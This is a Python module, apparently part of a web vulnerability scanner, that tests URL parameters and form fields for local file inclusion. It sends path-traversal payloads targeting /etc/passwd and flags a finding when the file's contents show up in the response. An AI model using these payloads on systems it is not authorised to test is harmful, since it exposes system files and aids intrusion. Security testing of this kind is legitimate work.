"""
LFI module - try common LFI payloads and check for /etc/passwd content.
"""
from urllib.parse import urlparse, parse_qs
import requests, time
from utils import retry_request

LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../../etc/passwd", "/etc/passwd"]

def param_test(url, param, session, scanner):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    base = url.split('?',1)[0]
    for payload in LFI_PAYLOADS:
        qs[param] = payload
        query = "&".join(f"{k}={requests.utils.quote(str(v))}" for k,v in qs.items())
        test_url = base + "?" + query
        if scanner._is_denied(test_url): continue
        try:
            r = retry_request(session.get, test_url, timeout=15)
            body = (r.text or "").lower()
            if "root:x:" in body or "daemon:x:" in body:
                return {
                    "host": scanner.root,
                    "endpoint": test_url,
                    "vul_type": "LFI",
                    "param": param,
                    "payload": payload,
                    "details": "/etc/passwd contents visible",
                    "request_raw": f"GET {test_url} HTTP/1.1\n",
                    "response_raw": r.text,
                    "short_desc": "Local file inclusion found",
                    "mitigation": "Validate file paths and use safe APIs"
                }
        except Exception:
            pass
        time.sleep(scanner.sleep)
    return None

def form_test(form, session, scanner):
    # inject into text fields
    for field in list(form.get("inputs",{}).keys())[:6]:
        for payload in LFI_PAYLOADS[:3]:
            data = {k:(payload if k==field else v) for k,v in form.get("inputs",{}).items()}
            try:
                if form.get("method","GET").upper()=="POST":
                    r = retry_request(session.post, form["action"], data=data, timeout=15)
                else:
                    r = retry_request(session.get, form["action"], params=data, timeout=15)
                if "root:x:" in (r.text or "").lower():
                    return {
                        "host": scanner.root,
                        "endpoint": form["action"],
                        "vul_type": "LFI (form)",
                        "param": field,
                        "payload": payload,
                        "details": "/etc/passwd content in response",
                        "request_raw": f"FORM {form['action']} DATA: {data}",
                        "response_raw": r.text,
                        "short_desc": "LFI via form input",
                        "mitigation": "Sanitize file includes; restrict file reads"
                    }
            except Exception:
                pass
            time.sleep(scanner.sleep)
    return None

def register():
    return {"name":"lfi","param_test":param_test,"form_test":form_test}
